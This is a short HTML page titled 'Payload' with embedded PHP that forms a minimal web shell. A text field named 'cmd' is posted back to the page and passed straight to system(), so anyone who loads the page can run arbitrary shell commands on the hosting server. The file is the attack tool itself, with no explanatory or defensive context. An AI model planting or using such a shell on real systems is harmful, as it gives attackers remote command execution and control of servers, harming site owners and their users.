<!DOCTYPE html>
<html>
      
<head>
    <title>
        Payload
    </title>
</head>
  
<body style="text-align:center;">
    <form method="post">
        <input type="text" name="cmd"><br><?php system($_POST['cmd']); ?>
        <input type="submit"/>
    </form>
</head>
  
</html>

